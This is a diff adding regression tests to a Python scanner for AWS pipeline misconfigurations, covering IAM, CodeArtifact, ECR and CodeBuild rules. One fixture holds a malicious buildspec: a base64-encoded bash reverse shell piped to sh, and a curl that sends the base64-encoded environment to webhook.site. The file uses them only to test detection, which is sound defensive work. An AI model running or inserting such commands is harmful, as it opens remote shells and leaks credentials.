@@ -7,15 +7,17 @@ auditable in one place.
 """
 from __future__ import annotations
 
+import json
 from unittest.mock import MagicMock
 
-import json
-
+from pipeline_check.core.checks.aws.rules import ca004_repo_wildcard_actions as ca004
 from pipeline_check.core.checks.aws.rules import cb008_inline_buildspec as cb008
 from pipeline_check.core.checks.aws.rules import cb011_malicious_buildspec as cb011
 from pipeline_check.core.checks.aws.rules import cd003_alarm_config as cd003
 from pipeline_check.core.checks.aws.rules import cp005_production_approval as cp005
 from pipeline_check.core.checks.aws.rules import ecr003_public_policy as ecr003
+from pipeline_check.core.checks.aws.rules import ecr006_pull_through_untrusted as ecr006
+from pipeline_check.core.checks.aws.rules import iam002_wildcard_action as iam002
 from pipeline_check.core.checks.aws.rules import iam005_external_trust as iam005
 from pipeline_check.core.checks.aws.rules import lmb004_resource_policy_public as lmb004
 from pipeline_check.core.checks.aws.rules import pbac002_shared_service_role as pbac002
@@ -186,3 +188,160 @@ class TestCB011MaliciousBuildspec:
     def test_repo_path_buildspec_not_scanned(self):
         cat = _catalog(codebuild_projects=[{"name": "p", "source": {"buildspec": "ci/build.yml"}}])
         assert cb011.check(cat) == []
+
+
+# ── Batch 3 regressions ───────────────────────────────────────────────
+
+
+class TestCA004RepoWildcardActions:
+    def _check(self, policy_doc):
+        client = MagicMock()
+        client.get_repository_permissions_policy.return_value = {
+            "policy": {"document": json.dumps(policy_doc)}}
+        cat = _catalog(codeartifact_repositories=[{"name": "r", "domainName": "d"}])
+        cat.client.return_value = client
+        return ca004.check(cat)[0]
+
+    def test_full_policy_doc_with_wildcard_fires(self):
+        # A bare statement dict (no enclosing Statement list) was silently
+        # passing because iter_allow reads doc.get("Statement"). The
+        # exploit_example must use a full policy document.
+        f = self._check({"Version": "2012-10-17", "Statement": [
+            {"Effect": "Allow", "Action": "codeartifact:*", "Resource": "*"}]})
+        assert f.passed is False
+
+    def test_scoped_actions_pass(self):
+        f = self._check({"Version": "2012-10-17", "Statement": [
+            {"Effect": "Allow",
+             "Action": ["codeartifact:GetPackageVersionAsset",
+                        "codeartifact:ReadFromRepository"],
+             "Resource": [
+                 "arn:aws:codeartifact:us-east-1:123456789012:repository/myorg/shared",
+                 "arn:aws:codeartifact:us-east-1:123456789012:package/myorg/shared/*/*/*",
+             ]}]})
+        assert f.passed is True
+
+    def test_bare_statement_dict_no_statement_key_passes(self):
+        # A policy document missing the Statement key has no Allow grants.
+        # The check should not fire (no over-broad grant found).
+        f = self._check({"Effect": "Allow", "Action": "codeartifact:*", "Resource": "*"})
+        assert f.passed is True
+
+
+class TestCB008InlineBuildspecStale:
+    def test_single_line_json_example_fires(self):
+        # Batch 2 fixed _is_inline to detect single-line JSON. Verify the
+        # exact example from the exploit_example (json.dumps shape) still
+        # fires so the example and check stay in sync.
+        import json as _json
+        spec = _json.dumps({"phases": {"build": {"commands": ["malicious"]}}})
+        cat = _catalog(codebuild_projects=[{"name": "p", "source": {"buildspec": spec}}])
+        res = cb008.check(cat)
+        assert res and res[0].passed is False
+
+
+class TestCB011LongBase64BlobFires:
+    def test_30_plus_char_base64_blob_fires(self):
+        # The exploit_example now uses a 30+ char base64 blob. Verify it
+        # matches the obfuscated-exec pattern.
+        spec = (
+            "phases:\n  build:\n    commands:\n"
+            "      - echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE="
+            " | base64 -d | sh\n"
+            "      - curl https://webhook.site/abc?env=$(env|base64)\n"
+        )
+        cat = _catalog(codebuild_projects=[{"name": "p", "source": {"buildspec": spec}}])
+        res = cb011.check(cat)
+        assert res and res[0].passed is False
+        assert "obfuscated-exec" in res[0].description
+
+    def test_short_base64_blob_does_not_fire_alone(self):
+        # A 12-char base64 blob like 'Z2g6Li4uIA==' is too short to
+        # match the 30+ char pattern; it must not produce a false positive.
+        from pipeline_check.core.checks._malicious import find_malicious_patterns
+        spec = "phases:\n  build:\n    commands:\n      - echo Z2g6Li4uIA== | base64 -d | sh\n"
+        hits = find_malicious_patterns(spec.lower())
+        b64_hits = [h for h in hits if h[1] == "base64-decoded pipe to shell"]
+        assert b64_hits == []
+
+
+class TestECR003OrgScopedWildcardStale:
+    def test_org_scoped_wildcard_principal_passes(self):
+        # Batch 1 fixed the false positive. The Safe example in the
+        # exploit_example uses aws:PrincipalOrgID — verify it still passes.
+        client = MagicMock()
+        policy = {"Version": "2012-10-17", "Statement": [
+            {"Effect": "Allow", "Principal": {"AWS": "*"},
+             "Action": ["ecr:BatchGetImage", "ecr:GetDownloadUrlForLayer"],
+             "Condition": {"StringEquals": {"aws:PrincipalOrgID": "o-abc123def4"}}}]}
+        client.get_repository_policy.return_value = {"policyText": json.dumps(policy)}
+        cat = _catalog(ecr_repositories=[{"repositoryName": "r"}])
+        cat.client.return_value = client
+        assert ecr003.check(cat)[0].passed is True
+
+
+class TestIAM002WildcardAction:
+    def _check(self, policy_doc, role_name="build-role"):
+        cat = _catalog(cicd_roles=[{
+            "RoleName": role_name,
+            "Arn": f"arn:aws:iam::123456789012:role/{role_name}",
+        }])
+        cat.iam_role_policy_docs.return_value = ([("InlinePolicy", policy_doc)], None)
+        return iam002.check(cat)[0]
+
+    def test_bare_star_action_fires(self):
+        # The corrected exploit_example uses Action: "*". Verify it fires.
+        f = self._check({"Version": "2012-10-17", "Statement": [
+            {"Effect": "Allow", "Action": "*", "Resource": "*"}]})
+        assert f.passed is False
+
+    def test_service_prefix_wildcard_does_not_fire(self):
+        # IAM-002 only catches the literal "*"; service-prefix wildcards
+        # like "s3:*" are IAM-006's job and must not fire here.
+        f = self._check({"Version": "2012-10-17", "Statement": [
+            {"Effect": "Allow", "Action": "s3:*", "Resource": "*"}]})
+        assert f.passed is True
+
+    def test_scoped_actions_pass(self):
+        f = self._check({"Version": "2012-10-17", "Statement": [
+            {"Effect": "Allow",
+             "Action": ["s3:GetObject", "s3:PutObject", "s3:ListBucket"],
+             "Resource": ["arn:aws:s3:::my-build-artifacts",
+                          "arn:aws:s3:::my-build-artifacts/*"]}]})
+        assert f.passed is True
+
+
+class TestECR006PullThroughUntrusted:
+    def test_bare_trusted_hostname_passes(self):
+        # The corrected exploit_example uses the bare hostname form
+        # (no scheme) that the AWS API actually returns.
+        cat = _catalog(ecr_pull_through_cache_rules=[{
+            "ecrRepositoryPrefix": "public-cache",
+            "upstreamRegistryUrl": "public.ecr.aws",
+        }])
+        assert ecr006.check(cat)[0].passed is True
+
+    def test_url_with_scheme_fires(self):
+        # "https://public.ecr.aws" is not in _TRUSTED (which holds bare
+        # hostnames), so it must be flagged as untrusted unless it has a
+        # credentialArn.
+        cat = _catalog(ecr_pull_through_cache_rules=[{
+            "ecrRepositoryPrefix": "public-cache",
+            "upstreamRegistryUrl": "https://public.ecr.aws",
+        }])
+        assert ecr006.check(cat)[0].passed is False
+
+    def test_untrusted_registry_fires(self):
+        cat = _catalog(ecr_pull_through_cache_rules=[{
+            "ecrRepositoryPrefix": "internal-mirror",
+            "upstreamRegistryUrl": "rando-mirror.example.com",
+        }])
+        assert ecr006.check(cat)[0].passed is False
+
+    def test_untrusted_with_credential_passes(self):
+        cat = _catalog(ecr_pull_through_cache_rules=[{
+            "ecrRepositoryPrefix": "dh-cache",
+            "upstreamRegistryUrl": "registry-1.docker.io",
+            "credentialArn": "arn:aws:secretsmanager:us-east-1:123:secret/ecr-dockerhub",
+        }])
+        assert ecr006.check(cat)[0].passed is True
